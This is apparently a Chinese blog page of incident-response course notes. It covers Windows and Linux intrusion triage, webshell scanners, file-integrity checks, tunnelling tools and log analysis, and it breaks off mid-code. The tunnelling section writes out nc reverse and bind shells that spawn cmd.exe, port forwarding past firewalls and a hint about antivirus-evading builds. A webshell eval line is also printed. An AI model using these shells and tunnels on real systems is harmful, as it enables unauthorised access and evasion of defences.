<p>​        1)对于低于win10版本的，打开 cmd 窗口，输入 lusrmgr.msc 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。</p>
<p>​        2)对于win10及win11可查看 “控制面板-&gt;用户账户”</p>
<ol start="3">
<li>查看服务器是否存在隐藏账号、克隆账号。<br>检查方法：</li>
</ol>
<p>​        1)打开注册表 ，查看管理员对应键值</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725211626893.png" alt="image-20220725211626893"></p>
<ol start="4">
<li>结合日志，查看管理员登录时间、用户名是否存在异常。<br>检查方法：</li>
</ol>
<p>​        1)Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p>
<p>​        2)导出Windows日志–安全（右键菜单-&gt;将所有事件另存为），利用Log Parser进行分析。<br><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725211819548.png" alt="image-20220725211819548"></p>
<p><strong>二、检查异常端口、进程</strong></p>
<ol>
<li>检查端口连接情况，是否有远程连接、可疑连接。<br>检查方法：</li>
</ol>
<p>​        1)netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED</p>
<p>​        2)根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist | findstr “PID”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725211902345.png" alt="image-20220725211902345"></p>
<p>2、排查可疑进程<br>检查方法：</p>
<ol>
<li>开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。</li>
<li>打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</li>
<li>通过微软官方提供的 Process Explorer 等工具进行排查 。</li>
<li>查看可疑的进程及其子进程。可以通过观察以下内容：<br> •没有签名验证信息的进程<br> •没有描述信息的进程<br> •进程的属主<br> •进程的路径是否合法<br> •CPU或内存资源占用长时间过高的进程</li>
</ol>
<p>3、小技巧：</p>
<ol>
<li>查看端口对应的PID： netstat -ano | findstr “port”</li>
<li>查看进程对应的PID：任务管理器–查看–选择列–PID 或者 tasklist | findstr “PID”</li>
<li>查看进程对应的程序位置：<br> •任务管理器–选择对应进程–右键打开文件位置<br> •运行输入 wmic，cmd界面 输入 process</li>
<li>tasklist /svc 进程–PID–服务</li>
<li>查看Windows服务所对应的端口： %system%/system32/drivers/etc/services（一般%system% 就是 C:\Windows）</li>
</ol>
<p><strong>三、检查启动项、计划任务、服务</strong></p>
<ol>
<li>检查服务器是否有异常的启动项。<br>检查方法：</li>
</ol>
<p>​        1)登录服务器，单击 “开始-&gt;所有程序-&gt;启动”，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p>
<p>​        2)单击开始“菜单-&gt;运行”，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示            的路径删除文件。</p>
<p>​        3)单击“开始-&gt;运行”，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：<br>​            •HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run<br>​            •HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>​            •HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<br>​        检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p>
<p>​        4)利用安全软件查看启动项、开机时间管理等。</p>
<p>​        5)组策略，运行gpedit.msc，观察是否存在开关机时自运行的脚本。</p>
<ol start="2">
<li>检查计划任务<br>检查方法：</li>
</ol>
<p>​        1)单击“开始-&gt;设置-&gt;控制面板-&gt;任务计划”，查看计划任务属性，便可以发现木马文件的路径。</p>
<p>​        2)单击“开始-&gt;运行；输入 cmd，然后输入at（Win10后at命令已弃用，改用schtasks.exe），检查计算机与网络上的其它计算机之间            的会话或计划任务，如有，则确认是否为正常连接。</p>
<ol start="3">
<li>服务自启动<br>检查方法：单击“开始-&gt;运行”，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。</li>
</ol>
<p><strong>四、检查系统相关信息</strong></p>
<ol>
<li>查看系统版本以及补丁信息<br>检查方法：单击“开始-&gt;运行”，输入systeminfo，查看系统信息</li>
</ol>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725212513068.png" alt="image-20220725212513068"></p>
<ol start="2">
<li>得到发现WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</li>
</ol>
<p>​        1)利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。</p>
<p>​        2)利用计算机自带文件搜索功能，指定修改时间进行搜索。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725212551781.png" alt="image-20220725212551781"></p>
<ol start="3">
<li>查找可疑目录及文件<br>检查方法：</li>
</ol>
<p>​        1)查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。<br>​        Window 2003    C:\Documents and Settings<br>​        Window 2008R2     C:\Users\</p>
<p>​        2)单击“开始-&gt;运行”，输入%UserProfile%\Recent，分析最近打开分析可疑文件。</p>
<p>​        3)在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p>
<p>​        4)回收站、浏览器下载目录、浏览器历史记录中修改时间在创建时间之前的为可疑文件</p>
<p><strong>五、自动化查杀</strong></p>
<ol>
<li>病毒查杀<br> 检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li>
<li>webshell查杀<br> 检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规则库的不足。</li>
</ol>
<h2 id="Linux-应急"><a href="#Linux-应急" class="headerlink" title="Linux 应急"></a>Linux 应急</h2><p><strong>常见排查思路</strong></p>
<p><strong>一、账号安全</strong><br>基本使用：</p>
<ol>
<li>/etc/passwd<br>用户名：口令：用户ID：组ID：用户说明：home目录：登陆之后shell<br>注意：无密码只允许本机登陆，远程不允许登陆</li>
</ol>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725212836369.png" alt="image-20220725212836369"></p>
<ol start="2">
<li>/etc/shadow<br> <code>root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</code><br> 用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</li>
</ol>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725213005759.png" alt="image-20220725213005759"></p>
<ol start="3">
<li>其他常用命令<br> who     查看当前登录用户（tty本地登陆 pts远程登录）<br> w    查看系统信息，想知道某一时刻用户的行为<br> uptime 查看登陆多久、多少用户，负载<br> 入侵排查：<br> 1)查询特权用户特权用户(uid 为0)<pre><code>     awk -F: &#39;$3==0&#123;print $1&#125;&#39; /etc/passwd
</code></pre>
 2)查询可以远程登录的帐号信息<pre><code>     awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow
</code></pre>
 3)除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限<pre><code>     more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;
</code></pre>
 4)禁用或删除多余及可疑的帐号<pre><code> usermod -L user     禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头
 userdel user    删除user用户
 userdel -r user     将删除user用户，并且将/home目录下的user目录一并删除
</code></pre>
</li>
</ol>
<p><strong>二、通过.bash_history查看帐号执行过的系统命令</strong><br>1、root的历史命令<br>histroy<br>2、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令，并为历史的命令增加登录的IP地址、执行命令时间等信息：<br>    1）保存1万条命令<br>        sed -i ‘s/^HISTSIZE=1000/HISTSIZE=10000/g’ /etc/profile<br>    2）在/etc/profile的文件尾部添加如下行数配置信息：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###### history #########</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">USER</span></span><br><span class="line"><span class="built_in"></span>_</span><br><span class="line"><span class="attribute">IP</span>=`who -u am i 2&gt;/dev/<span class="literal">null</span> | awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span> | sed -e <span class="string">&#x27;s/[()]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$USER</span></span></span><br><span class="line"><span class="string">_</span></span><br><span class="line"><span class="string">IP&quot;</span> = <span class="string">&quot;&quot;</span> ]</span><br><span class="line">then<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER</span></span><br><span class="line"><span class="built_in"></span>_</span><br><span class="line"><span class="attribute">IP</span>=`hostname`</span><br><span class="line">fi</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">HISTTIMEFORMAT</span>=<span class="string">&quot;%F %T <span class="variable">$USER_IP</span> `whoami` &quot;</span></span><br><span class="line">shopt -s histappend</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PROMPT_COMMAND</span>=<span class="string">&quot;history -a&quot;</span></span><br><span class="line"><span class="comment">######### history ##########</span></span><br></pre></td></tr></table></figure>

<p>​    3）source /etc/profile 让配置生效<br>​    生成效果： 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile<br>3、历史操作命令的清除：history -c</p>
<p><strong>三、检查异常端口</strong></p>
<ol>
<li><p>使用netstat 网络连接命令，分析可疑端口、IP、PID</p>
<pre><code>   `netstat -antlp|more`
</code></pre>
</li>
<li><p>查看pid所对应的进程文件路径，<br> <code>ls -l /proc/$PID/exe</code>      或     <code>file /proc/$PID/exe</code>（$PID 为对应的pid 号）</p>
</li>
</ol>
<p><strong>四、检查异常进程</strong></p>
<p>使用ps命令，分析进程            <code>ps aux | grep pid</code></p>
<p><strong>五、检查开机启动项</strong><br>基本使用：<br>Linux系统运行级别：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725213857913.png" alt="image-20220725213857913"></p>
<p>查看运行级别命令 runlevel</p>
<p>系统默认允许级别<br><code>vi /etc/inittab</code><br><code>id=3：initdefault </code>系统开机后直接进入哪个运行级别<br>开机启动配置文件<br><code>/etc/rc.local</code><br><code>/etc/rc.d/rc[0~6].d</code><br>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在<code>/etc/init.d</code>目录下，然后在<code>/etc/rc.d/rc*.d</code>中建立软链接即可        <code>ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code><br>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。<br>入侵排查：<br>启动项文件： <code>more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l</code><br><code>/etc/rc.d/rc3.d/</code></p>
<p><strong>六、检查定时任务</strong><br>基本使用<br>1、利用crontab创建计划任务<br>基本命令<br><code>crontab -l</code> 列出某个用户cron服务的详细内容<br>Tips：默认编写的crontab文件会保存在 (<code>/var/spool/cron/</code>用户名 例如: <code>/var/spool/cron/root</code>)<br><code>crontab -r</code> 删除每个用户cront任务(谨慎：删除所有的计划任务)<br><code>crontab -e </code>使用编辑器编辑当前的crontab文件<br>如：<code>/1 * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt</code> 每分钟写入文件<br>2、利用anacron实现异步定时任务调度<br>使用案例<br>每天运行 <code>/home/backup.sh</code> 脚本：<br><code>vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh</code><br>当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</p>
<p>对定时任务的排查：<br>重点关注以下目录中是否存在恶意脚本<br><code>/var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/*</code><br>小技巧：<br><code>more /etc/cron.daily/* </code>查看目录下所有文件</p>
<p><strong>七、检查是否存在正常业务之外的服务</strong><br>服务自启动的修改方法：<br>第一种修改方法：<br><code>chkconfig [--level 运行级别] [独立服务名] [on|off]</code><br><code>chkconfig –level 2345 httpd on</code> 开启自启动<br><code>chkconfig httpd on</code> （默认level是2345）<br>第二种修改方法：<br>修改<code> /etc/re.d/rc.local</code> 文件<br>加入 <code>/etc/init.d/httpd start</code><br>第三种修改方法：<br>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。</p>
<p><strong>入侵排查</strong><br>1、查询已安装的服务：<br>RPM包安装的服务<br><code>chkconfig --list</code> 查看服务自启动状态，可以看到所有的RPM包安装的服务<br><code>ps aux | grep crond</code> 查看当前服务<br>系统在3与5级别下的启动项<br>中文环境<br><code>chkconfig --list | grep &quot;3:启用\|5:启用&quot;</code><br>英文环境<br><code>chkconfig --list | grep &quot;3:on\|5:on&quot;</code><br>源码包安装的服务<br>查看服务安装位置 ，一般是在<code>/usr/local/</code><br>搜索<code>/etc/rc.d/init.d/ </code>查看是否存在开机自启动的服务</p>
<p><strong>八、检查异常文件</strong><br>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性<br>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？<br>可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件<br>3、针对可疑文件可以使用stat进行创建修改时间。</p>
<h2 id="WebShell-应急"><a href="#WebShell-应急" class="headerlink" title="WebShell 应急"></a>WebShell 应急</h2><p><strong>常见的WebShell查杀工具</strong></p>
<p><strong>D盾_Web查杀</strong><br>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为。<br>兼容性：只提供Windows版本。<br>工具下载地址：<a target="_blank" rel="noopener" href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214656225.png" alt="image-20220725214656225"></p>
<p><strong>百度WEBDIR+</strong><br>下一代WebShell检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。<br>兼容性：提供在线查杀木马，免费开放API支持批量检测。<br>在线查杀地址：<a target="_blank" rel="noopener" href="https://scanner.baidu.com/">https://scanner.baidu.com/</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214727303.png" alt="image-20220725214727303"></p>
<p><strong>河马</strong><br>专注webshell查杀研究，拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎<br>的查杀技术。查杀速度快、精度高、误报低。<br>兼容性：支持Windows、linux，支持在线查杀。<br>官方网站：<a target="_blank" rel="noopener" href="https://www.shellpub.com/">https://www.shellpub.com/</a>        <a target="_blank" rel="noopener" href="https://n.shellpub.com/">https://n.shellpub.com/</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214755414.png" alt="image-20220725214755414"></p>
<p><strong>Web Shell Detector</strong><br>Webshell Detector具有“ Webshell”签名数据库，可帮助识别高达99％的 Webshell 。<br>兼容性：提供php/python脚本，可跨平台，在线检测。<br>官方网站：<a target="_blank" rel="noopener" href="http://www.shelldetector.com/">http://www.shelldetector.com/</a><br>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214840659.png" alt="image-20220725214840659"></p>
<hr>
<p><strong>如何在百万行代码里发现隐藏的后门</strong></p>
<p>即使是一款拥有99.9%的Webshell检出率的检测引擎，依然可能存在Webshell绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽SEO手法，也很难通过手动检测或工具检测全部识别出来。面对一个大中型的应用系统，数以百万级的代码行，也是不可能做到每个文件每段代码进行手工检查的。最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。</p>
<p><strong>文件MD5校验</strong><br>下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个exe可执行文件，还有一个文件md5值。这个是软件作者在发布软件时，通过md5算法计算出该exe文件的“特征值”。<br>下载地址：<a target="_blank" rel="noopener" href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a><br><code>文件MD5：29285decadbce3918a4f8429ec33df46 WebShellKill.exe</code><br>当用户下载软件时，可以使用相同的校验算法计算下载到exe文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的exe文件是正确的。如果两个特征值不同，则认为下载到exe文件是被篡改过的。那同理可得，我们可以将所有网站文件计算一次hash值保存，当出现应急情况时，重新计算一次hash值，并与上次保存的hash值进行对比，从而输出新创建的、修改过及删除的文件列表。</p>
<p><strong>diff命令</strong><br>在linux中，我们经常使用diff来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。<br><code>diff -c -a -r [备份文件目录] [当前网站目录]</code><br>如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现low.php文件被篡改过，篡改的内容是<code>@eval($_POST[&#39;g&#39;]);</code>。<br>ps：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215300340.png" alt="image-20220725215300340"></p>
<p><strong>版本控制工具</strong><br>版本控制工具，比如说git，重新上传代码到git，add+commit+push，然后打开项目，点击commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。另外，也可以通过git diff 用来比较文件之间的不同。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215326416.png" alt="image-20220725215326416"></p>
<h2 id="常见代理软件"><a href="#常见代理软件" class="headerlink" title="常见代理软件"></a>常见代理软件</h2><p><strong>LCX</strong><br>lcx.exe是一个端口转发工具，有Windows版和Linux版两个版本，Windows版是lcx.exe,Linux版为portmap，<br>Windows版使用方法如下：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215424509.png" alt="image-20220725215424509"></p>
<p>lcx 有两大功能：<br>1）端口转发(listen和slave成对使用)<br>2）端口映射(tran)</p>
<p><strong>一、lcx 内网端口转发</strong><br>1.内网主机上执行：<br><code>lcx.exe –slave 公网主机ip 公网主机端口 内网主机ip 内网主机端口</code><br>例如：<br><code>lcx.exe -slave 公网主机ip 4444 127.0.0.1 3389</code><br>意思是把内网主机的 3389 端口转发到具有公网ip主机的 4444 端口<br>2.公网主机上执行<br><code>lcx.exe –listen 公网主机端口1 公网主机端口2</code><br>例如：<br><code>lcx.exe –listen 4444 5555</code><br>意思是监听公网主机本机的 4444 端口请求，并将来自 4444 端口的请求传送给 5555 端口。</p>
<p>此时，RDP 连接，Windows 命令行下输入mstsc，即可打开远程桌面连接:</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215603509.png" alt="image-20220725215603509"></p>
<p>如果是在公网主机上操作，计算机那栏只需要输入 127.0.0.1:5555，即可；如果是在本地主机上操作，则输入 公网主机ip:5555 ，然后输入用户名和密码，即可连接到内网主机。</p>
<p><strong>二、本地端口转发</strong><br>由于防火墙限制，部分端口如3389无法通过防火墙，此时可以将该目标主机的3389端口透传到防火墙允许的其他端口，如53端口。<br>目标主机上执行：<br><code>lcx -tran 53 目标主机ip 3389</code><br>这时我们可以直接远程桌面连接到到 目标主机IP:53    注：软件可能会被杀软查杀，可自行寻找免杀版本。</p>
<p>Linux版使用方法：<br>例如：<br>先在具有公网ip的主机上执行：<br><code>./portmap -m 2 -p1 6666 -h2 公网主机ip -p2 7777</code><br>意思是监听来自6666端口的请求，将其转发到7777端口;    再在内网主机上执行：<br><code>./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网主机ip -p2 6666</code><br>意思就是将内网主机22端口的流量转发到公网主机的6666端口。<br>然后在Linux系统命令行下执行<br><code>ssh 公网主机ip 7777</code><br>即可连接内网主机。</p>
<hr>
<p><strong>nc 反弹</strong><br>反向连接<br>在公网主机上进行监听：<br><code>nc -lvp 4444</code><br>在内网主机上执行：<br><code>nc -t -e cmd.exe 公网主机ip 4444</code><br>上述命令中 -t 参数是指通过telnet模式执行cmd.exe，可省略。成功后即可得到一个内网主机的cmd shell。</p>
<p>正向连接<br>远程主机上执行：<br><code>nc -l -p 4444 -t -e cmd.exe</code><br>本地主机上执行：<br><code>nc -vv 远程主机ip 4444</code><br>成功后，本地主机就获得了远程主机的一个cmd shell。</p>
<hr>
<p><strong>frp 内网穿透利器</strong><br>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。<br>工具地址： <a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a><br>frp 的作用<br>利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。</p>
<p>frp Windows平台文件目录如下：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725220020332.png" alt="image-20220725220020332"></p>
<p>其中frpc.ini和frpc_full.ini都为客户端配置文件，其中frpc_full.ini包括所有配置信息，我们可参考它来修改frpc.ini文件作为我们的配置文件，同理，frps.ini为服务器端配置文件。</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">服务端配置</span><br><span class="line"><span class="comment">#frps.ini</span></span><br><span class="line">[common]</span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">80</span></span><br><span class="line"><span class="attr">vhost_https_port</span> = <span class="number">443</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="attr">dashboard_user</span> = &#123;username&#125;</span><br><span class="line"><span class="attr">dashboard_pwd</span> = &#123;password&#125;</span><br><span class="line"><span class="attr">privilege_mode</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">privilege_token</span> = &#123;privilege_token&#125;</span><br><span class="line"></span><br><span class="line">[http]</span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="attr">auth_token</span> = &#123;auth_token&#125;</span><br><span class="line"><span class="attr">custom_domains</span> = &#123;cudtom_domains&#125;</span><br><span class="line">[https]</span><br><span class="line"><span class="attr">type</span> = https</span><br><span class="line"><span class="attr">auth_token</span> = &#123;auth_token&#125;</span><br><span class="line"><span class="attr">custom_domains</span> = &#123;custom_domains&#125;</span><br><span class="line">启动frp服务器端：</span><br><span class="line"></span><br><span class="line">frps.exe -c frps.ini</span><br><span class="line">浏览器访问： <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7500</span>，输入frps.ini中配置的用户名和密码即可进入控制面板。</span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">客户端配置</span><br><span class="line"><span class="comment">#frpc.ini</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = xxx</span><br><span class="line">server_port = 7000</span><br><span class="line">auth_token = &#123;auth_token&#125;</span><br><span class="line">privilege_token = &#123;privilege_token&#125;</span><br><span class="line">[http]</span><br><span class="line">type = http</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 80</span><br><span class="line">[https]</span><br><span class="line">type = https</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 443</span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 5555</span><br><span class="line">注意frp客户端和服务端的 auth_token 和privilege_token 等要保持一致。</span><br><span class="line">启动frp客户端：</span><br><span class="line">frpc.exe -c frpc.ini</span><br><span class="line">更多使用方法详见</span><br><span class="line"><span class="section">https://github.com/fatedier/frp/blob/master/README_zh.md</span></span><br></pre></td></tr></table></figure>







<h1 id="日志-amp-流量分析"><a href="#日志-amp-流量分析" class="headerlink" title="日志&amp;流量分析"></a>日志&amp;流量分析</h1><h2 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h2><p><strong>日志类型</strong></p>
<p><strong>内核及系统日志</strong></p>
<p>这种日志由syslog统一管理，根据其主配置文件”/etc/syslog.conf”中的设置决定将内核消息及各种系统程序消息记录到什么位置。</p>
<p><strong>用户日志</strong></p>
<p>这种日志数据用于记录Linux系统用户登录及退出系统的相关信息，包括用户名、登录的终端、登录时间、来源主机、正在使用的进程操作等。 </p>
<p><strong>程序日志</strong></p>
<p>有些应用程序运会选择自己来独立管理一份日志文件（而不是交给syslog服务管理），用于记录本程序运行过程中的各种事件信息。由于这些程序只负责管理自己的日志文件，因此不同的程序所使用的日志记录格式可能会存在极大差异。</p>
<p>通过查看 /etc/rsyslog.conf ，可查看相关系统日志配置情况。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801211012780.png" alt="image-20220801211012780"></p>
<p>linux系统日志一般存放在/var/log/目录下。</p>
<p>对于Linux系统中的一些常见日志文件，有必要熟悉其相应的用途，这样才能在需要的时候更快地找到问题所在，及时解决各种故障。</p>
<p>/var/log/messages：记录Linux内核消息及各种应用程序的公共日志信息，包括启动、IO错误、网络错误、程序故障等。对于未使用独立日志文件的应用程序或服务，一般都可以从该文件获得相关的事件记录信息。</p>
<p>/var/log/cron：记录crond计划任务产生的事件消息。</p>
<p>/varlog/dmesg：记录Linux系统在引导过程中的各种事件信息。</p>
<p>/var/log/maillog：记录进入或发出系统的电子邮件活动。</p>
<p>/var/log/lastlog：最近几次成功登录事件和最后一次不成功登录事件。</p>
<p>/var/log/rpmpkgs：记录系统中安装各rpm包列表信息。</p>
<p>/var/log/secure：记录用户登录认证过程中的事件信息.</p>
<p>/var/log/wtmp：记录每个用户登录、注销及系统启动和停机事件。</p>
<p>/var/log/utmp：记录当前登录的每个用户的详细信息</p>
<hr>
<p><strong>日志分析</strong></p>
<p>对于大多数文本格式的日志格式（如内核及系统日志、大多数的程序日志），只要使用tail、more、less、cat等文本处理工具就可以查看日志内容。而对于一些二进制格式的日志文件（eg：用户日志），则需要使用相应的查询命令。</p>
<p><strong>内核及系统日志:</strong></p>
<p>message日志，一般内核及大多数系统消息都被记录到公共日志文件”/var/log/messages”中，而其他一些程序消息被记录到不同的文件中，日志消息还能够记录到特定的存储设备中，或者直接向用户发送。具体根据rsyslog配置而定，日志如下</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801211704131.png" alt="image-20220801211704131"></p>
<p>secure是应急中最常用的文件，主要记录系统存取数据的文件，如POP3、ssh、telnet、ftp等相关记录，从日志中可看出系统服务是否遭受到安全威胁，从如下日志中可看到ftp服务一直在被破解。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801211732246.png" alt="image-20220801211732246"></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">可通过grep命令查找文件里符合条件的字符串， 定位有多少IP在爆破主机的 root 帐号：</span><br><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /<span 